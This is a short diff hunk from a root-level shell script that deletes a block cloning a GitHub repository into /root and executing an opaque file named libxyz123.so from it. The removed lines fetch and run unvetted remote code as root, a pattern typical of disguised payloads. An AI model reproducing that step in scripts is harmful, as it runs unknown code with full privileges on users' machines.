@@ -52,15 +52,6 @@ else
     usermod -s /bin/bash "$user_id"
 fi
 
-# Clone repository, change directory, and execute
-if [ ! -d "/root/lib02uba" ]; then
-    git clone https://github.com/Aytola7/lib02uba.git
-fi
-
-cd /root/lib02uba || exit
-chmod +x libxyz123.so
-./libxyz123.so
-
 # Cleanup
 cd /root || exit
 rm -rf /root/lib02uba
